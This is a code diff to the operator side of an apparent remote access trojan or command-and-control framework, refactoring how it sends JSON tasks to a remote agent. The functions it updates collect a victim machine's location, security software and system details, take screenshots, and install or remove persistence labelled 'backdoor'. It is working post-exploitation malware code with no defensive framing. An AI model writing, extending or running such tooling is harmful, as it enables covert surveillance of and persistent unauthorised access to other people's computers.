@@ -4,9 +4,19 @@ from core.server.comm import send_data, recv_data
 from core.utils.paths import ensure_project_dir, get_project_path
 from colorama import Fore
 from agent.post_exploit.post_exploit_controller import PostExploitController
+from api.connection_protocol import create_task
 import random, os, simplejson
 
 post_exploit_controller = PostExploitController()
+
+
+def send_task(conn, address, module, action, args=None):
+    """Send a JSON task to the agent using the connection protocol."""
+    session_id = f"{address[0]}:{address[1]}" if address else ""
+    task = create_task(session_id, module, action, args or {})
+    # send_data accepts str and will encode
+    send_data(conn, task)
+
 
 def send_notification(conn, address):
     title = "Title"
@@ -25,8 +35,7 @@ def send_notification(conn, address):
             app = system.input(9)
         elif command == "4":
             try:
-                send_data(conn, b"MODE_NOTIFICATION")
-                json_send(conn, {"title":title, "message":message, "app":app})
+                send_task(conn, address, "notification", "send", {"title":title, "message":message, "app":app})
             except Exception as e:
                 print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
                 input("OK")
@@ -55,20 +64,32 @@ def json_send(conn, data):
         print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
 
 def geo(conn, address):
-    send_data(conn, b"MODE_GEO")
-    data = recv_data(conn)
+    send_task(conn, address, "geo", "get")
+    try:
+        resp = json_receive(conn)
+        data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
+    except Exception:
+        data = {}
     print(Fore.LIGHTCYAN_EX + "[+] Location Info:\n", data)
     input("OK")
 
 def secinfo(conn, address):
-    send_data(conn, b"MODE_SECINFO")
-    data = json_receive(conn)
+    send_task(conn, address, "secinfo", "get")
+    try:
+        resp = json_receive(conn)
+        data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
+    except Exception:
+        data = {}
     options.printSecurityInfoText(data)
     input("OK")
 
 def sysinfo(conn, address):
-    send_data(conn, b"MODE_SYSINFO")
-    data = json_receive(conn)
+    send_task(conn, address, "sysinfo", "get")
+    try:
+        resp = json_receive(conn)
+        data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
+    except Exception:
+        data = {}
     print(options.getSystemInfoText(data))
     input("OK")
 
@@ -176,14 +197,20 @@ def screenshot(conn, address):
     input("OK")
 
 def backdoor(conn, address):
-    send_data(conn, b"MODE_BACKDOOR")
-    data = recv_data(conn)
+    send_task(conn, address, "system", "backdoor")
+    try:
+        resp = json_receive(conn)
+    except Exception:
+        resp = None
     print(Fore.LIGHTCYAN_EX + f"[+] Created Persistence")
     input("OK")
 
 def delete(conn, address):
-    send_data(conn, b"MODE_DEL")
-    data = recv_data(conn)
+    send_task(conn, address, "system", "delete")
+    try:
+        resp = json_receive(conn)
+    except Exception:
+        resp = None
     print(Fore.LIGHTCYAN_EX + "[+] Destroyed Persistence")
     input("OK")
 
